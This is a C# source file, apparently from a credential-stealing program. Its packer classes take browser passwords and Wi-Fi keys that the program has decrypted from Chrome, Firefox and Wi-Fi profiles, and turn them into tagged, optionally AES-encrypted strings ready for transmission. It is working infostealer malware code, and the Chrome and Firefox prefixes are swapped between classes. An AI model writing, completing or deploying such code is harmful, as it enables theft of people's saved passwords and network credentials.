using PS03.PasswordOps.ChromeDecrypt;
using PS03.PasswordOps.FirefoxDecrypt.Models;
using PS03.PasswordOps.WiPS.Models;

namespace PS03.Network.Transmit
{
    public abstract class Packer
    {
        private readonly SimpleAES enc = new SimpleAES();

        protected string Encrypt(string data)
        {
            return enc.EncryptToString(data);
        }
    }

    public class ChromePacker : Packer
    {
        public string Pack(CPProfile profile, bool encrypt)
        {
            var toencrypt = "FIREFOX:";
            if (!string.IsNullOrWhiteSpace(profile.ActionURL))
                toencrypt += ("ACTION=" + profile.ActionURL);
            else toencrypt += ("ACTION=EMPTY");

            if (!string.IsNullOrWhiteSpace(profile.Username))
                toencrypt += ("USER=" + profile.Username);
            else toencrypt += "USER=EMPTY";

            if (!string.IsNullOrWhiteSpace(profile.Password))
                toencrypt += ("PASS=" + profile.Password);
            else toencrypt += "PASS=EMPTY";

            if (encrypt)
                return Encrypt(toencrypt);
            return toencrypt;
        }
    }

    public class FirefoxPakcer : Packer
    {
        public string Pack(FFData profile, bool encrypt)
        {
            var toencrypt = "CHROME:";
            if (!string.IsNullOrWhiteSpace(profile.Host))
                toencrypt += ("ACTION=" + profile.Host);
            else toencrypt += ("ACTION=EMPTY");

            if (!string.IsNullOrWhiteSpace(profile.Username))
                toencrypt += ("USER=" + profile.Username);
            else toencrypt += "USER=EMPTY";

            if (!string.IsNullOrWhiteSpace(profile.Password))
                toencrypt += ("PASS=" + profile.Password);
            else toencrypt += "PASS=EMPTY";

            if (encrypt)
                return Encrypt(toencrypt);
            return toencrypt;
        }
    }

    public class WifiPacker : Packer
    {
        public string Pack(Profile profile, bool encrypt)
        {
            var toencrypt = "WIFI:";
            if (!string.IsNullOrWhiteSpace(profile.SSID))
                toencrypt += ("SSID=" + profile.SSID);
            else toencrypt += "SSID=EMPTY";
            if (!string.IsNullOrWhiteSpace(profile.Encryption))
                toencrypt += ("ENC=" + profile.Encryption);
            else toencrypt += "ENC=EMPTY";
            if (!string.IsNullOrWhiteSpace(profile.Password))
                toencrypt += ("PASS=" + profile.Password);
            else toencrypt += "PASS=EMPTY";
            return encrypt ? Encrypt(toencrypt) : toencrypt;
        }
    }
}